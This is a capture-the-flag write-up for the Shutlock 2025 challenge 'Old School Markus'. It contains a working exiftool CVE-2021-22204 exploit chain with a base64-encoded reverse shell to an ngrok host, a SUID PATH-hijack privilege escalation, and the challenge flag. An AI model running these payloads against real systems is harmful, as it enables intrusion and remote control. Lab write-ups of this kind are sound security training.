# Old School Markus - Shutlock 2025

> Une personne de mon équipe m'a envoyé son projet de visualisation de données pour un jeu qu'il aime bien. Son projet n'a pas l'air fiable et en plus il est "Old School", peut-être un peu trop.
>
> Aide moi à lui prouver que rien ne va !

## looking at the website

in the main page form, we can see the following fields:

```html
<form method="GET">
  <input type="text" name="server" placeholder="IP du serveur (ex: play.monserveur.com)" required>
  <input type="number" name="port" placeholder="Port du serveur (ex: 25565)" required>
  <!-- <input type="hidden" name="debug" value="debug_for_admin_20983rujf2j1i2" > -->
  <button type="submit">🎮 Obtenir les Infos</button>
</form>
```

there's an hidden `debug` value which we can use later.

## starting a fake minecraft server

```bash
git clone https://github.com/ZockerSK/FakeMCServer
python3 main.py
# running the server once will create a config.json file with default values
```

after calling a few times the app using `curl 'http://57.128.112.118:14635/?server=4.tcp.eu.ngrok.io&port=13957'`, we can fix issues such as:

- the server needs at least 1 000 000 players online
- the server's description needs to contain the words "Cannes" and "Cinema"

also after looking at the packets sent, we can see that they expect protocol `47`, which is the protocol used by Minecraft 1.8.0, not sure if this is required but let's use it anyway.

```json
{
  "ip": "0.0.0.0",
  "kick_message": [
    "§bSorry",
    "",
    "§aThis server is offline!"
  ],
  "motd": {
    "1": "Cannes et Cinema",
    "2": "Cannes et Cinema"
  },
  "player_max": 1000000,
  "player_online": 1000000,
  "port": 25565,
  "protocol": 47,
  "samples": [],
  "server_icon": "server_icon.jpg",
  "show_hostname_if_available": true,
  "show_ip_if_hostname_available": true,
  "version_text": "1.8.0"
}
```

then we can start the server:

```bash
python3 main.py
ngrok tcp 25565 # to expose the server
```

## looking at the server icon

when the server have a server icon, the website will display it.
if we use the debug value, we can see this extra information:

```html
<!-- Exiftool Version: 12.23, Taille du fichier: 73 -->
```

after a quick search, version `12.23` of `exiftool` is vulnerable: <https://ine.com/blog/exiftool-command-injection-cve-2021-22204-exploitation-and-prevention-strategies> (we'll use this article as a reference)

## building the payload

```bash
nc -lvn 10000
ngrok tcp 10000 # to expose the server
```

let's build our image with an existing `jpg` image...
we don't actually care if the image is a minecraft server icon or not, we just need to inject our payload in it,
the app will process it anyway.

```bash
$ echo 'sh -i >& /dev/tcp/6.tcp.eu.ngrok.io/13039 0>&1' | base64
c2ggLWkgPiYgL2Rldi90Y3AvNi50Y3AuZXUubmdyb2suaW8vMTMwMzkgMD4mMQo=
```

write the following payload in a `payload` file!

```
(metadata "\c${system('echo c2ggLWkgPiYgL2Rldi90Y3AvNi50Y3AuZXUubmdyb2suaW8vMTMwMzkgMD4mMQo= | base64 -d | bash')};")
```

then let's build our djvu from the payload!

```bash
# compress the payload
$ bzz payload payload.bzz

# create a djvu file with the payload
$ djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
```

write the following config file into an `exifconfig` file for `exiftool` configuration.

```
%Image::ExifTool::UserDefined = (
    'Image::ExifTool::Exif::Main' => {
        0xc51b => {
            Name => 'HasselbladExif',
            Writable => 'string',
            WriteGroup => 'IFD0',
        },
    },
);
1; #end%
```

now let's inject our payload in any `jpg`!

```bash
$ exiftool -config exifconfig '-HasselbladExif<=exploit.djvu' image.jpg
#                                               ^ exploit we created above
#                                                             ^ source image we'll modify
```

let's use this image as our server icon now.

```bash
mv image.jpg server_icon.jpg # path from the fake server config, see above

# let's call the app!
curl 'http://57.128.112.118:14635/?server=4.tcp.eu.ngrok.io&port=13957&debug=debug_for_admin_20983rujf2j1i2'
```

## reverse shell

we're now in, after running `ls -la` we can see the following files:

```bash
$ ls -la
total 52
drwxr-xr-x 1 flaskuser flaskuser  4096 Jun 23 22:21 .
drwxr-xr-x 1 root      root       4096 Jun 23 22:21 ..
-rw-r--r-- 1 flaskuser flaskuser  2454 May 29 10:39 app.py
---s--x--x 1 root      root      16184 May 29 10:39 fix_permissions
---------- 1 root      root         40 May 29 10:39 flag.txt
drwxr-xr-x 1 flaskuser flaskuser  4096 Jun 23 22:41 images
-rw-r--r-- 1 flaskuser flaskuser    25 May 29 10:39 requirements.txt
-rw-r--r-- 1 flaskuser flaskuser     2 Jun 23 22:21 supervisord.pid
drwxr-xr-x 1 flaskuser flaskuser  4096 May 29 10:39 templates
```

trying to read the flag does not work:

```bash
$ cat flag.txt
cat: flag.txt: Permission denied

$ whoami
flaskuser
```

there is a `fix_permissions` script that we can run but it outputs nothing.

## privilege escalation

after looking at suid exploits, i found out an interesting one.

```bash
mkdir /tmp/fakebin
echo -e '#!/bin/bash\nbash' > /tmp/fakebin/chmod
chmod +x /tmp/fakebin/chmod
PATH=/tmp/fakebin:$PATH ./fix_permissions
```

it consists in creating a fake `chmod` binary that will run a bash shell instead of changing permissions. here we're expecting the `fix_permissions` script to call `chmod` but this is simply a guess!

after running the above command, we can see that we have a root shell:

```bash
$ PATH=/tmp/fakebin:$PATH ./fix_permissions
/tmp/fakebin/chmod: 1: -e: not found
$ whoami
root
```

## looking at the `fix_permissions` binary (for fun)

after installing `strings` (since the machine did not have it), we can run `strings ./fix_permissions` to see what it uses:

```
/lib64/ld-linux-x86-64.so.2
puts
setgid
setuid
execl
printf
getuid
[*] Fixing permissions for files in /app/images
[*] Running as UID: %d
[*] Command: chmod 400 *
cd /app/images && chmod 400 *
/bin/sh
GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0
```

> (i removed not interesting strings)

as we can see, it runs `cd /app/images && chmod 400 *` and that's how we got our root shell!

## flag

```bash
$ cat flag.txt
SHLK{O!d_Sch0Ol_Guy_Ho1ds_Olds_V3rsions}
```

boom, we got the flag!
